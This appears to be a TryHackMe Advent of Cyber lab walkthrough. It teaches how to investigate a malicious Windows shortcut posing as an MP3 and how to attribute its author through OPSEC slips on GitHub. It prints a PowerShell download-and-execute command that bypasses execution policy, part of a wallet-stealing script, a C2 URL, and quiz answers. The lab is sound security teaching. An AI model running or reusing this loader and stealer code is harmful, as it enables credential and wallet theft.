The Story

Task banner for day DAY 1
McSkidy tapped keys with a confident grin,
A suspicious website, now where to begin?
She'd seen sites like this, full of code and of grime,
Shady domains, and breadcrumbs easy to find.

Click here to watch the walkthrough video!

McSkidy's fingers flew across the keyboard, her eyes narrowing at the suspicious website on her screen. She had seen dozens of malware campaigns like this. This time, the trail led straight to someone who went by the name "Glitch."

"Too easy," she muttered with a smirk.

"I still have time," she said, leaning closer to the screen. "Maybe there's more."

Little did she know, beneath the surface lay something far more complex than a simple hacker's handle. This was just the beginning of a tangled web unravelling everything she thought she knew.

Illustration showing McSkidy in front of a house
Learning Objectives

```
Learn how to investigate malicious link files.
Learn about OPSEC and OPSEC mistakes.
Understand how to track and attribute digital identities in cyber investigations.
```

Connecting to the Machine

Before moving forward, review the questions in the connection card shown below and start the virtual machine by pressing the Start Machine button. The VM should be fully loaded in 3 minutes. Additionally, you will need the AttackBox, which can be launched by clicking the Start AttackBox button at the top of the page.

NOTE:

If you’re clicking "Start Machine" and encountering an issue launching it, don’t worry—it’s just the high demand. What can you do?

```
Keep trying! Machines are becoming available as demand fluctuates.
If you’re still having trouble, come back a little later when it’s less busy.
```

Banner showing connection options provided in this room.
Investigating the Website

The website we are investigating is a Youtube to MP3 converter currently being shared amongst the organizers of SOC-mas. You've decided to dig deeper after hearing some concerning reports about this website.

A screenshot of the website.

From your AttackBox, access the website by visiting MACHINE_IP using the web browser.

At first glance, the website looks legit and presentable. The About Page even says that it was made by "The Glitch ". How considerate of them to make our job easier!

Scrolling down, you'll see the feature list, which promises to be "Secure" and "Safe." From our experience, that isn't very likely.
Youtube to MP3 Converter Websites

These websites have been around for a long time. They offer a convenient way to extract audio from YouTube videos, making them popular. However, historically, these websites have been observed to have significant risks, such as:

```
Malvertising: Many sites contain malicious ads that can exploit vulnerabilities in a user's system, which could lead to infection.
Phishing scams: Users can be tricked into providing personal or sensitive information via fake surveys or offers.
Bundled malware: Some converters may come with malware, tricking users into unknowingly running it.
```

What nefarious thing does this website have in store for us?
Getting Some Tunes

Let's find out by pasting any YouTube link in the search form and pressing the "Convert" button. Then select either mp3 or mp4 option. This should download a file that we could use to investigate. For example, we can use <https://www.youtube.com/watch?v=dQw4w9WgXcQ>, a classic if you ask me.

Once downloaded, navigate to your Downloads folder or if you are using the AttackBox, to your /root/ directory. Locate the file named download.zip, right-click on it, and select Extract To. In the dialog window, click the Extract button to complete the extraction.

A screenshot presenting extraction of a zip archive.

You'll now see two extracted two files: song.mp3 and somg.mp3.

To quickly determine the file's contents, double-click on the "Terminal" icon on the desktop then run the file command on each one. First, let's try checking song.mp3.
Check File 1 Terminal

user@tryhackme:\~$ file song.mp3
download.mp3: Audio file with ID3 version 2.3.0, contains:MPEG ADTS, layer III, v1, 192 kbps, 44.1 kHz, Stereo

There doesn't seem to be anything suspicious, according to the output. As expected, this is just an MP3 file.

How about the second file somg.mp3? From the filename alone, we can tell something is not right. Still, let's confirm by running the file command on it anyway.
Check File 2 Terminal

user@tryhackme:\~$ file somg.mp3
somg.mp3: MS Windows shortcut, Item id list present, Points to a file or directory, Has Relative path, Has Working directory, Has command line arguments, Archive, ctime=Sat Sep 15 07:14:14 2018, mtime=Sat Sep 15 07:14:14 2018, atime=Sat Sep 15 07:14:14 2018, length=448000, window=hide

Now, this is more interesting!

The output tells us that instead of an MP3, the file is an "MS Windows shortcut", also known as a .lnk file. This file type is used in Windows to link to another file, folder, or application. These shortcuts can also be used to run commands! If you've ever seen the shortcuts on a Windows desktop, you already know what they are.

There are multiple ways to inspect .lnk  files to reveal the embedded commands and attributes. For this room, however, we'll use ExifTool, which is already installed on this machine.

To do this, go back to your Terminal and type:
Using Exiftool Terminal

user@tryhackme:\~$ exiftool somg.mp3

Look through the output to locate the command used as a shortcut in the somg.mp3 file. If you scroll down through the output, you should see a PowerShell command.
Using Exiftool Terminal

...
Relative Path                   : ......\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe
Working Directory               : C:\\Windows\\System32\\WindowsPowerShell\\v1.0
Command Line Arguments          : -ep Bypass -nop -c "(New-Object Net.WebClient).DownloadFile('[https://raw.githubusercontent.com/MM-WarevilleTHM/IS/refs/heads/main/IS.ps1','C:\\ProgramData\\s.ps1](https://raw.githubusercontent.com/MM-WarevilleTHM/IS/refs/heads/main/IS.ps1','C:%5CProgramData%5Cs.ps1)'); iex (Get-Content 'C:\\ProgramData\\s.ps1' -Raw)"
Machine ID                      : win-base-2019
user@tryhackme:\~#

What this PowerShell command does:

```
The -ep Bypass -nop flags disable PowerShell's usual restrictions, allowing scripts to run without interference from security settings or user profiles.
The DownloadFile method pulls a file (in this case, IS.ps1) from a remote server (https://raw.githubusercontent.com/MM-WarevilleTHM/IS/refs/heads/main/IS.ps1) and saves it in the C:\\ProgramData\\ directory on the target machine.
Once downloaded, the script is executed with PowerShell using the iex command, which triggers the downloaded s.ps1 file.
```

If you visit the contents of the file to be downloaded using your browser (<https://raw.githubusercontent.com/MM-WarevilleTHM/IS/refs/heads/main/IS.ps1>), you will see just how lucky we are that we are not currently using Windows.
PowerShell Script Terminal


function Print-AsciiArt {
Write-Host "  ____     _       ___  _____    ___    _   _ "
Write-Host " / *|   | |     |* *||*   *|  / __|  | | | |"Write-Host "| |  _    | |      | |   | |   | |     | |*| |"
Write-Host "| || |   | |__   | |   | |   | |__   |  _  |"
Write-Host " _*__|   |__*__| |__*|  |*|    ___|  |*| |*|"

```
Write-Host "         Created by the one and only M.M."
```

}

# Call the function to print the ASCII art

Print-AsciiArt

# Path for the info file

$infoFilePath = "stolen_info.txt"

# Function to search for wallet files

function Search-ForWallets {
$walletPaths = @(
"$env:USERPROFILE.bitcoin\\wallet.dat",
"$env:USERPROFILE.ethereum\\keystore\*",
"$env:USERPROFILE.monero\\wallet",
"$env:USERPROFILE.dogecoin\\wallet.dat"
)
Add-Content -Path $infoFilePath -Value "\`n### Crypto Wallet Files ###"
foreach ($path in $walletPaths) {
if (Test-Path $path) {
Add-Content -Path $infoFilePath -Value "Found wallet: $path"
}
}
}

\[Output truncated for brevity\]

The script is designed to collect highly sensitive information from the victim's system, such as cryptocurrency wallets and saved browser credentials, and send it to an attacker's remote server.

Disclaimer: All content in this room, including CPP code, PowerShell scripts, and commands, is provided solely for educational purposes. Please do not execute these on a Windows host.

This looks fairly typical of a PowerShell script for such a purpose, with one notable exception: a signature in the code that reads.

```
Created by the one and only M.M.
```

Searching the Source

There are many paths we could take to continue our investigation. We could investigate the website further, analyse its source code, or search for open directories that might reveal more information about the malicious actor's setup. We can search for the hash or signature on public malware databases like VirusTotal or Any.Run. Each of these methods could yield useful clues.

However, for this room, we'll try something a bit different. Since we already have the PowerShell code, searching for it online might give us useful leads. It's a long shot, but we'll explore it in this exercise.

There are many places where we can search for code. The most widely used is Github. So let's try searching there.

To search effectively, we can look for unique parts of the code that we could use to search with. The more distinctive, the better. For this scenario, we have the string we've uncovered before that reads:

"Created by the one and only M.M."

Search for this on [Github.com](http://Github.com) or by going directly to this link: [https://github.com/search?q="Created+by+the+one+and+only+M.M."&type=issues](https://github.com/search?q=%22Created+by+the+one+and+only+M.M.%22&type=issues)

GitHub search results page based on the keywords indicated.

You'll notice something interesting if you explore the pages in the search results.
Note!

If you receive an error below, it's because Github has rate limits in place if you are not signed in. To fix this, you can just sign in with a GitHub account or skip directly to the next step by going here: <https://github.com/Bloatware-WarevilleTHM/CryptoWallet-Search/issues/1>

GitHub error message requesting the user to login to access the resource.

If you look through the search results, you can be able infer the malicious actor's identity based on information on the project's page and the GitHub Issues section.

MM's GitHub comment on the referenced project, revealing their identity.

Aha! Looks like this user has made a critical mistake.
Introduction to OPSEC

This is a classic case of OPSEC failure.

Operational Security (OPSEC) is a term originally coined in the military to refer to the process of protecting sensitive information and operations from adversaries. The goal is to identify and eliminate potential vulnerabilities before the attacker can learn their identity.

In the context of cyber security, when malicious actors fail to follow proper OPSEC practices, they might leave digital traces that can be pieced together to reveal their identity. Some common OPSEC mistakes include:

```
Reusing usernames, email addresses, or account handles across multiple platforms. One might assume that anyone trying to cover their tracks would remove such obvious and incriminating information, but sometimes, it's due to vanity or simply forgetfulness.
Using identifiable metadata in code, documents, or images, which may reveal personal information like device names, GPS coordinates, or timestamps.
Posting publicly on forums or GitHub (Like in this current scenario) with details that tie back to their real identity or reveal their location or habits.
Failing to use a VPN or proxy while conducting malicious activities allows law enforcement to track their real IP address.
```

You'd think that someone doing something bad would make OPSEC their top priority, but they're only human and can make mistakes, too.

For example, here are some real-world OPSEC mistakes that led to some really big fails:
AlphaBay Admin Takedown

One of the most spectacular OPSEC failures involved Alexandre Cazes, the administrator of AlphaBay, one of the largest dark web marketplaces:

```
Cazes used the email address "pimp_alex_91@hotmail.com" in early welcome emails from the site.
This email included his year of birth and other identifying information.
He cashed out using a Bitcoin account tied to his real name.
Cazes reused the username "Alpha02" across multiple platforms, linking his dark web identity to forum posts under his real name.
```

Chinese Military Hacking Group (APT1)

There's also the notorious Chinese hacking group APT1, which made several OPSEC blunders:

```
One member, Wang Dong, signed his malware code with the nickname "Ugly Gorilla".
This nickname was linked to programming forum posts associated with his real name.
The group used predictable naming conventions for users, code, and passwords.
Their activity consistently aligned with Beijing business hours, making their location obvious.
```

These failures provided enough information for cyber security researchers and law enforcement to publicly identify group members.
Uncovering MM

If you've thoroughly investigated the GitHub search result, you should have uncovered several clues based on poor OPSEC practices by the malicious actor.

We know the attacker left a distinctive signature in the PowerShell code (MM). This allowed us to search for related repositories and issues pages on GitHub. We then discovered an Issues page where the attacker engaged in discussions, providing more context and linking their activity to other projects.

Illustration of a mansion with footsteps leading to it.

In this discussion, they responded to a query about modifying the code. This response, paired with their unique handle, was another critical slip-up, leaving behind a trail of evidence that can be traced back to them. By analysing the timestamps, usernames, and the nature of their interactions, we can now attribute the mastermind behind the attack to MM.
What's Next?

McSkidy dug deeper, her mind sharp and quick,
But something felt off, a peculiar trick.
The pieces she’d gathered just didn’t align,
A puzzle with gaps, a tangled design.

As McSkidy continued digging, a pattern emerged that didn't fit the persona she was piecing together. A different handle appeared in obscure places, buried deep in the details: "MM."

"Who's MM?" McSkidy muttered, the mystery deepening.

Even though all signs on the website seemed to point to Glitch as the author, it became clear that someone had gone to great lengths to ensure Glitch's name appeared everywhere. Yet, the scattered traces left by MM suggested a deliberate effort to shift the blame.


Answer the questions below

Looks like the song.mp3 file is not what we expected! Run "exiftool song.mp3" in your terminal to find out the author of the song. Who is the author?

Tyler Ramsbey


The malicious PowerShell script sends stolen info to a C2 server. What is the URL of this C2 server?

<http://papash3ll.thm/data>


Who is M.M? Maybe his Github profile page would provide clues?

Mayor Malware


What is the number of commits on the GitHub repo where the issue was raised?

1